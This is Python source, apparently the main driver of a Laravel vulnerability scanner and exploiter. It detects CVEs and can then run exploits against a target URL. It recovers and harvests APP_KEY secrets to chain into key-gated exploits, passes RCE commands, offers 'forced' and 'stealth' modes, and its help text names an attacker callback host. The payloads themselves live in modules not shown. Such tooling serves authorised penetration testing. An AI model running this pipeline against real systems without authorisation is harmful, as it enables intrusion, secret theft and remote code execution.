# Consumers: APP_KEY-gated detectors that now declare an explicit app_key= param and consume an
# injected key (verdict upgrade: "sink present" -> "confirmed exploitable now").
_DETECT_ALL_CONSUMERS = {"cve_2018_15133", "cve_2024_48987", "cve_2024_55555", "cve_2024_55556"}


def _safe_scan(name: str, fn, *args, **kwargs):
    """Run a scan fn (or any detector), catching exceptions so one module failure
    never aborts the entire scan (mirrors the try/except discipline in run_exploitation).
    """
    try:
        http_config.set_active_module(name)
        return fn(*args, **kwargs)
    except Exception as e:
        print_status(f"{name} crashed during scan: {e}", "error")
        return None
    finally:
        http_config.set_active_module(None)


def _is_positive_finding(res, *, vuln_class=None):
    """True only for current-target vulnerability proof."""
    return is_confirmed_detection(detection_verdict(res, vuln_class=vuln_class))


def _init_http_from_args(args):
    """Configure process-wide HTTP proxy/TLS/trace/headers for all scanner modules.

    Request logging is OFF by default (http_config._trace_http=False at import).
    --trace-http enables it. --no-trace is kept for backward compatibility (no-op).
    configure() is still called when proxy/-H headers are set so those features wire up
    correctly; the early-return no longer skips tracing.
    """
    proxy = getattr(args, "proxy", None)
    no_trace = getattr(args, "no_trace", False)  # kept for compat; now a no-op
    trace_http_on = getattr(args, "trace_http", False)

    # --trace-http: enable per-request URL logging (off by default).
    if trace_http_on:
        http_config.enable_trace()

    # Parse -H "Name: Value" headers (also carries Cookie: / Authorization: for auth).
    headers = {}
    try:
        headers = http_config.parse_headers(getattr(args, "header", None))
    except ValueError as e:
        print_status(str(e), "error")
        raise SystemExit(2)

    # configure() needed for proxy and/or custom headers; not needed for trace-only
    # (the patch is already installed at import, _trace_http already set above).
    if not (proxy or headers):
        return

    verify = None
    if proxy:
        try:
            proxy = http_config.validate_proxy_url(proxy)
        except ValueError as e:
            print_status(str(e), "error")
            raise SystemExit(2)
        verify = True if getattr(args, "secure", False) else None

    http_config.configure(proxy, verify=verify, trace_http=trace_http_on, headers=headers)

    if proxy:
        print_status(f"HTTP proxy: {proxy} (all module traffic routed)", "warning")
        if not getattr(args, "secure", False):
            print_status("TLS certificate verification disabled", "info")

    if headers:
        names = ", ".join(headers.keys())
        print_status(f"Injecting {len(headers)} custom header(s) into all module requests: {names}", "warning")


def _json_safe(value):
    """Return a JSON-serializable copy of scanner output."""
    if isinstance(value, dict):
        return {str(k): _json_safe(v) for k, v in value.items()}
    if isinstance(value, (list, tuple)):
        return [_json_safe(v) for v in value]
    if isinstance(value, set):
        return sorted((_json_safe(v) for v in value), key=str)
    if isinstance(value, (str, int, float, bool)) or value is None:
        return value
    return str(value)


def _write_json_report(path, payload):
    """Emit the structured validation report requested by harnesses and workbook sync tools."""
    if not path:
        return
    report = json.dumps(_json_safe(payload), indent=2, sort_keys=True)
    if path == "-":
        print(report)
        return
    with open(path, "w", encoding="utf-8") as f:
        f.write(report + "\n")
    print_status(f"JSON report written: {path}", "info")


def run_exploitation(target_url, only_cve=None, do_exploit=False,
                     username=None, password=None, command=None, app_key=None,
                     exploit_policy="confirmed-only",
                     in_house=False, extra_options=None,
                     minimal_recon=False):
    """Detect (and optionally exploit) CVEs, processed most-critical-first.

    Per the exploit contract each module.exploit() returns a result dict and never raises.
    Findings are printed ranked by Independent severity. A single CVE can be selected with --cve.
    """
    target_url = normalize_base(target_url)
    # NB: main() already prints the banner before dispatching here (the only caller), so we do not
    # re-print it — doing so double-banners every --exploit/--cve run.
    print_separator()
    print_status(f"Target: {Fore.YELLOW}{target_url}{Style.RESET_ALL}", "info")

    targeted_minimal = bool(only_cve and minimal_recon)
    laravel_info = None
    if targeted_minimal:
        print_status(
            "Targeted CVE mode: skipping broad Laravel recon/discovery; the selected module "
            "will run its own minimum proof requests.",
            "info",
        )
        laravel_info = _advisory_laravel_info(target_url)
        laravel_info["advisory_mode"] = True
    else:
        laravel_info = is_laravel(target_url, stealth=in_house)
        if not laravel_info:
            print_status("Target does not appear to be a Laravel application — continuing anyway "
                         "(exploit modules self-gate on their own preconditions).", "warning")
        else:
            print_status("Laravel framework detected.", "success")
            _print_laravel_details(laravel_info)  # version + cookies + indicators (same recon as detect-all)
        # Commit to the canonical base after redirects (e.g. http -> https), so every module requests
        # the final scheme directly and we don't duplicate each request as an http leg + an https follow.
        if laravel_info and laravel_info.get("final_url") and laravel_info["final_url"] != target_url:
            print_status(f"Following redirect to canonical base: {laravel_info['final_url']}", "info")
            target_url = laravel_info["final_url"]

    # Probe for optional components (Livewire, Reverb) so component-gated CVEs can be skipped
    # when the component is confirmed absent (all canonical probe URLs returned 404).
    # discover_resources() returns a laravel_info-like dict; the "components" list carries
    # "<name>_absent" tokens when absence is confirmed and "<name>" tokens when confirmed present.
    # Fail-open: any non-404 response (401/403/302/no-response) leaves the component unknown ->
    # gated CVEs still run. Only call when laravel_info is available (we have a base to probe).
    _exploit_absent: set = set()
    _probe_components: set = set()
    if not targeted_minimal:
        try:
            _disc = discover_resources(
                target_url,
                root_resp=(laravel_info or {}).get("_root_resp") if laravel_info else None,
            )
            if not laravel_info:
                laravel_info = _advisory_laravel_info(target_url)
            for _tok in (_disc.get("components") or []):
                _probe_components.add(_tok)
                if _tok.endswith("_absent"):
                    _exploit_absent.add(_tok)
            laravel_info["components"] = list(_probe_components)
            laravel_info["route_map"] = _disc.get("route_map", {})
            laravel_info["debug_mode"] = _disc.get("debug_mode", False)
        except Exception:
            pass  # discovery failure is non-fatal; exploit run continues unaffected

    ctx = PipelineContext(
        target_url=target_url,
        laravel_info=laravel_info or {},
        discovery={"route_map": (laravel_info or {}).get("route_map", {}),
                   "components": (laravel_info or {}).get("components", []),
                   "debug_mode": (laravel_info or {}).get("debug_mode", False)},
        request_budget={},
    )
    if laravel_info:
        ctx.set_artifact(
            "laravel",
            "info",
            {
                "components": laravel_info.get("components", []),
                "route_map": laravel_info.get("route_map", {}),
                "debug_mode": laravel_info.get("debug_mode", False),
            },
        )

    print_separator()

    # Build the operator session by OPERATOR INTENT (auth-wiring spec):
    # a real authenticated session is offered only when -H cookie/auth material exists.
    # Keeping credentials separate avoids breaking self-login paths.
    shared_session = http_config.get_auth_session() if http_config.has_auth_headers() else None

    targets = cves_by_criticality()
    # Auto-chain ordering guarantee: a producer must run before any consumer for its leaked key to land
    # in `loot` in time. We keep most-critical-first and only nudge producers forward within their
    # severity bucket.
    _APP_KEY_PRODUCERS = APP_KEY_PRODUCERS  # canonical set from exploit_registry (single source of truth)
    targets = sorted(
        targets,
        key=lambda c: (SEV_RANK.get(CVE_META[c][0], 4), 0 if c in _APP_KEY_PRODUCERS else 1),
    )
    if only_cve:
        if only_cve not in CVE_META:
            print_status(f"{only_cve} is not an exploit-capable CVE in this catalog. "
                         f"Use --list to see supported CVEs.", "error")
            return {
                "ok": False,
                "mode": "exploit" if do_exploit else "detect",
                "target": target_url,
                "policy": exploit_policy,
                "error": f"{only_cve} is not an exploit-capable CVE in this catalog",
                "summary": [],
            }
        targets = [only_cve]

    mode = "DETECT + EXPLOIT" if do_exploit else "DETECT ONLY (pass --exploit to attempt exploitation)"
    print_status(f"Mode: {mode}  |  {len(targets)} CVE(s), most critical first", "info")
    print_separator()

    # -- immutable option bag, per-CVE copy before optional auto-chain injection.
    options = {}
    if app_key:
        options["app_key"] = app_key
    for _k, _v in (extra_options or {}).items():
        if _k == "app_key" and app_key:
            continue
        options[_k] = _v
    if not options.get("app_key"):
        options.pop("app_key", None)

    # Run-scoped loot bag: producers can feed a confirmed key into later app_key-gated consumers.
    loot = {}
    operator_app_key_present = bool(options.get("app_key"))

    # Zero-HTTP APP_KEY recovery from leaked/default keys, if available.
    if not operator_app_key_present and laravel_info and laravel_info.get("cookies"):
        try:
            from modules.probes.appkey_recovery import recover_app_key
            _rec = recover_app_key(
                target_url,
                laravel_info=laravel_info,
                include_live_cookie=False,
                include_detection_producers=False,
                include_cve_methods=False,
                active_module="appkey-recovery",
            )
        except Exception:
            _rec = None
        if _rec and _rec.get("app_key"):
            loot["app_key"] = _rec["app_key"]
            loot["app_key_source_cve"] = _rec.get("source") or "wordlist-hmac"
            print_status(
                f"APP_KEY recovered OFFLINE from cookie via wordlist HMAC "
                f"(known/leaked/default key reuse) — auto-chaining into app_key-gated CVEs", "critical")

    # Whole-app-root static disclosure: surface in the exploit path too (the detection registry
    # that normally renders it does not run here). The disclosed-file inventory is itself the
    # finding, so we always run it; it additionally seeds APP_KEY into the loot chain when .env is
    # among the exposed files and no operator key was supplied. Read-only; no-op on a correctly
    # public/-rooted target (returns None). Kept so it can be re-echoed in the end-of-run rollup —
    # under --trace-http the recon-phase line scrolls away behind thousands of [HTTP] lines.
    _app_root_finding = None
    if not targeted_minimal:
        _app_root_finding = _run_app_root_disclosure(
            target_url, laravel_info, None if operator_app_key_present else loot)

    summary = []
    chained_cves = {}
    outcome_tags = {}
    oob_pending_cves = set()

    # Policy handling. `--cve` scopes a row; only --force / forced bypasses gates.
    policy = (exploit_policy or "confirmed-only").lower()
    if policy == "detected-only":
        print_status(
            "Exploit policy 'detected-only' is a compatibility alias for confirmed-only; "
            "confirmed detections and targeted auto-chainable RCE preconditions can trigger exploitation.",
            "info",
        )
        policy = "confirmed-only"
    if policy not in ("confirmed-only", "aggressive", "forced"):
        policy = "confirmed-only"
    if policy == "forced":
        print_status("Exploit policy: forced (operator explicitly bypassed conservative gates)", "warning")
    elif policy == "aggressive":
        print_status("Exploit policy: aggressive (run exploits when module preconditions are satisfied)", "warning")
    elif policy == "confirmed-only":
        print_status(
            "Exploit policy: confirmed-only (confirmed_vulnerable auto-runs; targeted command-capable "
            "RCEs may auto-chain from version/precondition/sink hits)",
            "info",
        )
    force_requested = policy == "forced"
    if force_requested:
        options["force"] = True
        options["exploit_policy"] = "forced"
    else:
        options.setdefault("exploit_policy", policy)

    http_config.reset_request_stats()
    import importlib

    for cve in targets:
        http_config.set_active_module(cve)
        try:
            sev, vclass, cmd_cap, auth_req, key_req = CVE_META[cve]
        except KeyError:
            continue
        resolved_username = username
        resolved_password = password

        forced_component_bypass = None
        _req_comp = _CVE_REQUIRES_COMPONENT.get(cve)
        if _req_comp and (_req_comp + "_absent") in _exploit_absent:
            if policy == "forced":
                forced_component_bypass = f"{_req_comp} confirmed absent by probe; forced by policy"
                print_status(
                    f"[{sev}] {cve} ({vclass}) — forcing targeted run despite "
                    f"{_req_comp} absence probe (--force / forced policy)",
                    "warning",
                )
            else:
                probe_note = f"{_req_comp} confirmed absent by probe"
                print_status(
                    f"[{sev}] {cve} ({vclass}) — skipped "
                    f"({_req_comp} confirmed absent — probe returned 404; use --force to override)",
                    "info",
                )
                summary.append({
                    "cve": cve,
                    "sev": sev,
                    "vclass": vclass,
                    "scan": "not_applicable",
                    "attempted": False,
                    "success": False,
                    "probe_note": probe_note,
                    "detection": {
                        "cve": cve,
                        "vulnerable": False,
                        "status": "not_applicable",
                        "verdict": "not_applicable",
                        "reason": probe_note,
                    },
                    "request_budget": ctx.request_budget.get(cve, {}),
                })
                continue

        # Resolve modules.
        scan_fn = None
        exploit_fn = None
        try:
            scan_fn = import_scan(cve)
        except Exception as e:
            print_status(f"{cve}: failed to load detection module ({e})", "error")
        if do_exploit:
            try:
                exploit_fn = _import_exploit(cve)
            except Exception as e:
                print_status(f"{cve}: failed to load exploitation module ({e})", "error")
        if scan_fn is None and exploit_fn is None:
            continue

        # =========================== detection =====================================
        before_detect = http_config.get_request_stats()
        detected = None
        if scan_fn is not None:
            try:
                det_candidate = {
                    "session": shared_session,
                    "username": resolved_username,
                    "password": resolved_password,
                    "laravel_info": laravel_info,
                    "discovery": ctx.discovery,
                    "route_map": ctx.route_map,
                }
                det_app_key = options.get("app_key") or (
                    loot.get("app_key") if key_req else None
                )
                if det_app_key:
                    det_candidate["app_key"] = det_app_key
                det_options = dict(options) if options else {}
                if det_options:
                    det_candidate["options"] = det_options
                det_candidate["force"] = force_requested
                det_candidate["exploit_policy"] = policy
                detected = scan_fn(target_url, **_accepted_kwargs(scan_fn, det_candidate))
            except Exception as e:
                print_status(f"{cve}: scan() error ({e})", "warning")
        after_detect = http_config.get_request_stats()
        ctx.record_request_cost(cve, "detect", before_detect, after_detect)

        det = normalize_detection_result(cve, detected, vuln_class=vclass)
        if forced_component_bypass:
            det["probe_note"] = forced_component_bypass

        det_flag = det.get("verdict") or detection_verdict(detected, vuln_class=vclass)
        if _scan_is_hit(det_flag) and forced_component_bypass:
            print_status(
                f"{cve}: component absence probe was contradicted by the CVE detector; "
                "using the CVE-specific detector result",
                "warning",
            )
            forced_component_bypass = None
            det.pop("probe_note", None)
        if _scan_is_hit(det_flag):
            # central version-applicability gate (shared with detect-all)
            fw_ver = (laravel_info or {}).get("composer_lock_version") if laravel_info else None
            _suppress = version_suppresses(cve, fw_ver)
            if _suppress and not force_requested:
                det_flag = "blocked_by_control"
                print_status(_suppress, "info")
                det["suppressed"] = True
                det["suppression_reason"] = _suppress
            elif _suppress and force_requested:
                print_status(f"{_suppress}; bypassed by forced policy", "warning")
                det["suppression_bypassed_by_force"] = _suppress

        det["verdict"] = det_flag
        det["status"] = det_flag
        print_status(f"[{sev}] {cve} ({vclass}) — scan: {det_flag}", _SEV_STATUS.get(sev, "info"))
        if only_cve:
            _print_scan_result(cve, det, det_flag, targeted=True)
        ctx.record_detection(cve, det)

        # Producer pre-chain harvest from detection.
        if cve in _APP_KEY_PRODUCERS and _scan_is_hit(det_flag) and "app_key" not in loot:
            _dkey = det.get("artifacts", {}).get("app_key")
            if _dkey:
                loot["app_key"] = _dkey
                loot["app_key_source_cve"] = cve
                print_status(
                    f"{cve}: recovered APP_KEY via detection — harvested into run loot "
                    f"(available to auto-chain into app_key-gated CVEs)", "warning")

        # Standard APP_KEY auto-identification for key-gated consumers: when the operator passed no
        # --app-key and none has been chained yet, go through the standard recovery workflow (offline
        # cookie-HMAC against the public/leaked/default wordlist, then safe producer detections)
        # regardless of policy. This populates loot["app_key"] BEFORE the auto-chain/policy/key gates
        # below, so a recoverable key lets `--exploit` auto-chain the same way `--force` already does.
        # No lab-pinned key is ever injected — a non-reused key simply does not recover.
        if (do_exploit and key_req and not operator_app_key_present and not loot.get("app_key")
                and (_scan_is_hit(det_flag) or det_flag in _AUTO_CHAINABLE_SCAN_VERDICTS
                     or force_requested)):
            _recover_app_key(
                target_url,
                laravel_info,
                loot,
                session=shared_session,
                cve=cve,
                det=det,
                username=resolved_username,
                password=resolved_password,
                options=options,
            )

        # detect-only mode
        if not do_exploit:
            summary.append({
                "cve": cve,
                "sev": sev,
                "vclass": vclass,
                "scan": det_flag,
                "attempted": False,
                "success": False,
                "probe_note": forced_component_bypass,
                "detection": det,
                "request_budget": ctx.request_budget.get(cve, {}),
            })
            continue

        auto_chain_ok, auto_chain_reason = _auto_chain_allowed(
            only_cve=only_cve,
            det_flag=det_flag,
            exploit_fn=exploit_fn,
            cmd_cap=cmd_cap,
            vclass=vclass,
            auth_req=auth_req,
            key_req=key_req,
            resolved_username=resolved_username,
            resolved_password=resolved_password,
            shared_session=shared_session,
            operator_app_key_present=operator_app_key_present,
            loot=loot,
        )
        if auto_chain_ok:
            print_status(f"{cve}: auto-chaining exploit under confirmed-only policy — {auto_chain_reason}", "warning")

        # policy gate and safe skip (confirmed-only)
        if policy == "confirmed-only" and not _scan_is_hit(det_flag) and not auto_chain_ok:
            res = {
                "cve": cve,
                "attempted": False,
                "success": False,
                "vuln_class": vclass,
                "evidence": "",
                "detail": f"exploit skipped by policy: confirmed-only and scan was '{det_flag}'",
                "artifacts": {},
                "requires": [],
                "reason": "policy", 
            }
            _print_exploit_result(cve, res)
            summary.append({
                "cve": cve,
                "sev": sev,
                "vclass": vclass,
                "scan": det_flag,
                "attempted": False,
                "success": False,
                "probe_note": forced_component_bypass,
                "detection": det,
                "exploit_result": res,
                "request_budget": ctx.request_budget.get(cve, {}),
            })
            continue

        # key-gated consumers skip unless forced or a key is available.
        if (key_req and not operator_app_key_present and not loot.get("app_key")
                and policy != "forced"):
            reason = (
                f"{cve}: skipped — no confirmed APP_KEY available. "
                f"Pass --app-key, --force, or a confirmed producer chain"
            )
            print_status(reason, "info")
            res = {
                "cve": cve,
                "attempted": False,
                "success": False,
                "vuln_class": vclass,
                "evidence": "",
                "detail": "exploitation skipped: no confirmed APP_KEY",
                "artifacts": {},
                "requires": ["app_key"],
                "reason": "no APP_KEY from operator (--app-key), detection, or chain this run",
            }
            _print_exploit_result(cve, res)
            summary.append({
                "cve": cve,
                "sev": sev,
                "vclass": vclass,
                "scan": det_flag,
                "attempted": False,
                "success": False,
                "probe_note": forced_component_bypass,
                "detection": det,
                "exploit_result": res,
                "request_budget": ctx.request_budget.get(cve, {}),
            })
            continue

        # (APP_KEY recovery already ran above for all policies, before the auto-chain/policy/key
        # gates — see _recover_app_key call after detection. No force-specific recovery needed.)

        cve_options = dict(options)
        if force_requested:
            cve_options["force"] = True
            cve_options["exploit_policy"] = "forced"
        else:
            cve_options.setdefault("exploit_policy", policy)
        if auto_chain_ok:
            cve_options["auto_chain"] = True
            cve_options["auto_chain_from"] = det_flag
        if key_req and not operator_app_key_present and loot.get("app_key"):
            cve_options["app_key"] = loot["app_key"]
            cve_options["app_key_source"] = loot.get("app_key_source_cve", "?")
            chained_cves[cve] = loot.get("app_key_source_cve", "?")
            print_status(
                f"{cve}: using APP_KEY auto-harvested from {loot.get('app_key_source_cve', '?')} (chain) — "
                f"no operator --app-key supplied",
                "warning")

        if exploit_fn is None:
            res = {
                "cve": cve,
                "attempted": False,
                "success": False,
                "vuln_class": vclass,
                "evidence": "",
                "detail": "exploitation module not available",
                "artifacts": {},
                "requires": [],
                "reason": "missing exploit() implementation",
            }
            _print_exploit_result(cve, res)
            summary.append({
                "cve": cve,
                "sev": sev,
                "vclass": vclass,
                "scan": det_flag,
                "attempted": False,
                "success": False,
                "probe_note": forced_component_bypass,
                "detection": det,
                "exploit_result": res,
                "request_budget": ctx.request_budget.get(cve, {}),
            })
            continue

        # =========================== exploitation ============================
        before_exploit = http_config.get_request_stats()
        try:
            exp_candidate = {
                "session": shared_session,
                "username": resolved_username,
                "password": resolved_password,
                "command": command,
                "options": cve_options or None,
                "detection": det,
                "detection_artifacts": det.get("artifacts", {}),
                "route_map": ctx.route_map,
                "laravel_info": laravel_info,
                "discovery": ctx.discovery,
                "force": force_requested,
                "exploit_policy": policy,
            }
            res = exploit_fn(target_url, **_accepted_kwargs(exploit_fn, exp_candidate))
        except Exception as e:
            res = {"cve": cve, "attempted": True, "success": False, "vuln_class": vclass,
                   "evidence": "", "detail": "exploit() raised (contract violation)",
                   "artifacts": {}, "requires": [], "reason": f"{type(e).__name__}: {e}"}
        after_exploit = http_config.get_request_stats()
        ctx.record_request_cost(cve, "exploit", before_exploit, after_exploit)
        res = normalize_exploit_result(cve, res)

        if not res.get("attempted") and _scan_is_hit(det_flag):
            # Keep contract shape predictable for downstream consumers.
            res["attempted"] = True

        # Producer harvest from exploit artifacts.
        if cve in _APP_KEY_PRODUCERS and "app_key" not in loot:
            _arts = res.get("artifacts", {})
            _leaked = _arts.get("app_key") or _arts.get("leaked_app_key")
            if _leaked:
                loot["app_key"] = _leaked
                loot["app_key_source_cve"] = cve
                print_status(
                    f"{cve}: harvested APP_KEY into run loot — available to auto-chain into "
                    f"later app_key-gated CVEs", "warning")

        _print_exploit_result(cve, res)
        reported_cve = res.get("reattributed_cve")
        summary.append({
            "cve": cve,
            "sev": sev,
            "vclass": vclass,
            "scan": det_flag,
            "attempted": bool(res.get("attempted")),
            "success": bool(res.get("success")),
            "reported_cve": reported_cve,
            "outcome_tag": res.get("outcome_tag"),
            "probe_note": forced_component_bypass,
            "detection": det,
            "exploit_result": res,
            "request_budget": ctx.request_budget.get(cve, {}),
        })
        if res.get("success") and res.get("outcome_tag"):
            outcome_cve = reported_cve or cve
            outcome_tags[outcome_cve] = res["outcome_tag"]
            outcome_tags[cve] = res["outcome_tag"]
        if not res.get("success") and res.get("oob_pending"):
            oob_pending_cves.add(reported_cve or cve)
        
    # Ranked summary (shared renderer — identical format for detect-only and exploit runs)
    # highlight on for both phases: detect-only runs make a confirmed detection pop (green + ► CONFIRMED),
    # exploit runs make a confirmed compromise pop (red + ►► PWNED) and dim the n/a rows.
    _print_summary(
        summary,
        do_exploit=do_exploit,
        outcome_tags=outcome_tags,
        oob_pending_cves=oob_pending_cves,
        chained_cves=chained_cves,
        highlight=True,
    )
    if do_exploit and summary:
        _print_outcome_rollup(summary, oob_pending_cves, _app_root_finding)
    http_config.set_active_module(None)
    return {
        "ok": True,
        "mode": "exploit" if do_exploit else "detect",
        "target": target_url,
        "only_cve": only_cve,
        "policy": policy,
        "summary": summary,
        "loot": {
            "app_key_present": bool(loot.get("app_key")),
            "app_key_source": loot.get("app_key_source_cve"),
        },
        "request_stats": http_config.get_request_stats(),
        "app_root_disclosure": bool(_app_root_finding),
    }




def main():
    show_banner()
    print_separator()

    parser = argparse.ArgumentParser(
        description="Laravel Vulnerability Scanner & Exploiter",
        epilog="Examples:\n"
               "  check.py https://target              # detect-all (request URLs silent by default)\n"
               "  check.py https://target --trace-http  # show every outbound HTTP request URL\n"
               "  check.py https://target --proxy http://127.0.0.1:8080\n"
               "  check.py https://target --exploit    # detect, then exploit each finding\n"
               "  check.py https://target --cve CVE-2025-14894 --exploit --proxy http://127.0.0.1:8080\n"
               "  check.py https://target --cve CVE-2024-55661 --exploit -U admin -P secret\n"
               "  check.py https://target -H 'Cookie: laravel_session=...'   # force authenticated scan\n"
               "  check.py --list                      # list supported CVEs by criticality",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("url", nargs="?", help="Target URL (e.g., https://example.com)")
    parser.add_argument("--exploit", action="store_true",
                        help="After detection, attempt real exploitation (per CVE class).")
    parser.add_argument(
        "--exploit-policy",
        dest="exploit_policy",
        choices=("confirmed-only", "detected-only", "aggressive", "forced"),
        default="confirmed-only",
        help="Exploit execution policy. confirmed-only=run exploit after confirmed_vulnerable detection, "
             "or auto-chain targeted command-capable RCEs from version/precondition/sink hits; "
             "aggressive=run exploit whenever module preconditions are satisfied, "
             "detected-only=compatibility alias for confirmed-only, "
             "forced=run despite non-positive detection (legacy behavior).",
    )
    parser.add_argument(
        "--force",
        action="store_true",
        help="Alias for --exploit --exploit-policy forced; bypass conservative gates on one-off runs.",
    )
    parser.add_argument("--cve", metavar="CVE-YYYY-NNNNN", default=None,
                        help="Limit to a single CVE (scan, and exploit if --exploit).")
    parser.add_argument("-U", "--username", default=None, help="Auth username for exploits that need it.")
    parser.add_argument("-P", "--password", default=None, help="Auth password for exploits that need it.")
    parser.add_argument("--command", "--cmd", dest="command", default=None,
                        help="Command for RCE-class exploits (default: CVE-specific 'echo <CVE> PoC && id && hostname'). "
                             "--cmd is an accepted alias.")
    parser.add_argument("-X", "--method", choices=("GET", "POST"), default="POST",
                        help="HTTP method for parameter-driven exploit modules that support it (default: POST).")
    parser.add_argument("-p", "--params", default=None,
                        help="Comma-separated parameter names for parameter-driven exploit modules "
                             "(default is module-specific; CVE-2022-2870/2886 use username,password).")
    parser.add_argument("--app-key", dest="app_key", default=None,
                        help="Known APP_KEY for crypto-gated exploits (e.g. cookie deserialization).")
    parser.add_argument(
        "--json-out",
        metavar="PATH",
        default=None,
        help="Write a structured JSON validation report. Use '-' to print JSON to stdout.",
    )
    parser.add_argument(
        "--opt", dest="opts", action="append", metavar="KEY=VALUE", default=None,
        help="Pass an arbitrary key=value into a module's exploit() options dict (repeatable). "
             "Lets the operator supply preconditions that aren't HTTP-observable, e.g. the Redis "
             "scaling bus for CVE-2026-23524: --opt redis_host=10.0.0.5 --opt redis_port=6379 "
             "--opt oob_read_url=http://target/reverb-oob for scanner readback, or "
             "--opt oob_read_url=https://attacker.oast.site/ for target POST callback. Values are strings; "
             "purely-numeric values are coerced to int (so redis_port=6379 arrives as an int).")
    parser.add_argument("--list", action="store_true",
                        help="List all exploit-capable CVEs ranked by Independent severity, then exit.")
    parser.add_argument("--list-detectors", action="store_true",
                        help="List all detection-path detectors with category, scope, and auth-gating.")
    parser.add_argument(
        "--list-paths",
        metavar="WORDLIST",
        choices=["general", "webshell"],
        default=None,
        help="Print paths from wordlists/general_laravel.txt or wordlists/laravel_webshell_paths.txt "
             "(for ffuf/feroxbuster; not used by the default scan).",
    )
    proxy_group = parser.add_argument_group(
        "HTTP proxy",
        "Route every scanner module's requests through a proxy (e.g. Burp on 127.0.0.1:8080). "
        "TLS verification is off by default when --proxy is set.",
    )
    proxy_group.add_argument(
        "--proxy",
        metavar="URL",
        default=None,
        help="HTTP(S) proxy URL (e.g. http://127.0.0.1:8080). TLS verify off unless --secure.",
    )
    proxy_group.add_argument(
        "--no-trace",
        dest="no_trace",
        action="store_true",
        help="No-op (request logging is now off by default). Kept for backward compatibility.",
    )
    proxy_group.add_argument(
        "--trace-http",
        action="store_true",
        help="Enable per-request URL logging: prints [HTTP] [module] METHOD URL for every request.",
    )
    parser.add_argument(
        "--in-house", "--stealth", dest="in_house", action="store_true",
        help="In-house/stealth profile: de-emphasize public filesystem probes in Laravel detection "
             "(.env, composer.lock, vendor) and some component routes. Improves recall on hardened "
             "or subdirectory deployments. (Implements Rec 6/9 behavioral strengthening.)",
    )
    proxy_group.add_argument(
        "--secure",
        action="store_true",
        help="With --proxy: keep TLS verification on. Default without this flag is verify=False.",
    )
    parser.add_argument(
        "-H", "--header",
        action="append",
        metavar="'Name: Value'",
        default=None,
        help="Add a custom header to EVERY module request (repeatable). Use to force "
             "authenticated scanning, e.g. -H 'Cookie: laravel_session=...' "
             "-H 'Authorization: Bearer ...'.",
    )
    args = parser.parse_args()

    # --opt KEY=VALUE (repeatable) -> a flat dict merged into every module's exploit() options.
    # Purely-numeric values are coerced to int so e.g. redis_port=6379 arrives as 6379, not "6379".
    extra_options = {}
    for _kv in (args.opts or []):
        if "=" not in _kv:
            print_status(f"Ignoring --opt {_kv!r}: expected KEY=VALUE.", "warning")
            continue
        _k, _v = _kv.split("=", 1)
        _k = _k.strip()
        if not _k:
            print_status(f"Ignoring --opt {_kv!r}: empty key.", "warning")
            continue
        _v = _v.strip()
        if _k == "app_key" and not _v:
            print_status("Ignoring --opt app_key=: empty APP_KEY.", "warning")
            continue
        extra_options[_k] = int(_v) if _k != "app_key" and _v.lstrip("-").isdigit() else _v
    if args.method:
        extra_options["method"] = args.method.upper()
    if args.params is not None:
        params = [p.strip() for p in args.params.split(",") if p.strip()]
        if params:
            extra_options["params"] = params
        else:
            print_status("Ignoring -p/--params: no non-empty parameter names supplied.", "warning")

    if extra_options and not (args.exploit or args.cve):
        print_status("--opt values will be offered to detect-all modules that declare options=; "
                     "other detectors ignore them.", "info")

    # --list: print the criticality-ranked CVE table and exit (no target needed).
    if args.list:
        _print_cve_list()
        return

    # --list-detectors: print all detection-path detectors with scope + auth-gating, then exit.
    if args.list_detectors:
        print(f"{'NAME':24} {'CATEGORY':12} {'SCOPE':13} {'AUTH':5} CVE / DESCRIPTION")
        for d in get_detectors():
            cve = d.get("cve") or ""
            scope = d.get("scope") or (scope_of(cve) if cve else "generic")
            auth = "yes" if d.get("requires_auth") else "no"
            print(f"{d.get('name',''):24} {d.get('category',''):12} {scope:13} {auth:5} {cve} {d.get('description','')}")
        return

    if args.list_paths:
        from modules.probes.path_wordlists import iter_paths

        for path in iter_paths(args.list_paths):
            print(path)
        return

    # Per-target boundary: clear the within-run Response memo so a fresh process (or a
    # re-invocation) never serves a /composer.lock (etc.) body seeded for a previous target.
    # Placed AFTER the no-scan early-returns (--list/--list-detectors) and BEFORE either scan
    # branch (exploit dispatch below, or the detect-all fall-through) — the single point every
    # actual scan flows through, before is_laravel()/discovery seeds the memo.
    reset_run_memo()

    # --exploit / --cve / --force: route to the exploitation pipeline (separate from detect-all).
    if args.exploit or args.cve or args.force:
        if not args.url:
            print(f"{Fore.YELLOW}[?] Enter target URL: {Style.RESET_ALL}", end="")
            args.url = input().strip()
        _init_http_from_args(args)
        _exploit_target = normalize_base(args.url)
        _warn_if_deep_link(_exploit_target)
        _policy = "forced" if args.force else args.exploit_policy
        _policy_forces_target = bool(args.cve and _policy == "forced")
        if args.force and args.exploit_policy != "forced":
            print_status("Both --force and --exploit-policy supplied; --force overrides to forced.", "warning")
        _payload = run_exploitation(
            _exploit_target,
            only_cve=(args.cve.upper() if args.cve else None),
            do_exploit=(args.exploit or args.force or _policy_forces_target),
            username=args.username, password=args.password,
            command=args.command, app_key=args.app_key,
            exploit_policy=_policy,
            in_house=getattr(args, "in_house", False),
            extra_options=extra_options,
            minimal_recon=bool(args.cve),
        )
        _write_json_report(args.json_out, _payload)
        return

    if not args.url:
        print(f"{Fore.YELLOW}[?] Enter target URL: {Style.RESET_ALL}", end="")
        args.url = input().strip()

    target_url = normalize_base(args.url)

    _init_http_from_args(args)

    _warn_if_deep_link(target_url)

    print_status(f"Initializing scan for: {Fore.YELLOW}{target_url}{Style.RESET_ALL}", "info")
    print_status("Checking if target is a Laravel application...", "info")

    # --- Laravel detection block (uses the new detect_laravel.is_laravel) ---
    laravel_info = is_laravel(target_url, stealth=getattr(args, "in_house", False))

    # Commit to the canonical base after redirects (e.g. http -> https) so every detector requests
    # the final scheme directly — avoids duplicating each probe as an http leg + an https follow.
    if laravel_info and laravel_info.get("final_url") and laravel_info["final_url"] != target_url:
        print_status(f"Following redirect to canonical base: {laravel_info['final_url']}", "info")
        target_url = laravel_info["final_url"]

    framework_detected = bool(laravel_info)
    if not laravel_info:
        print_status("Target did not strongly match common Laravel fingerprints (common for in-house / hardened / subpath deployments).", "warning")
        print_status("Continuing with best-effort scan — modules will self-gate on their own preconditions where possible.", "warning")
        print_separator()
    else:
        print_status("Laravel framework detected! ", "success")
        _print_laravel_details(laravel_info)  # shared renderer (clean per-cookie breakdown)

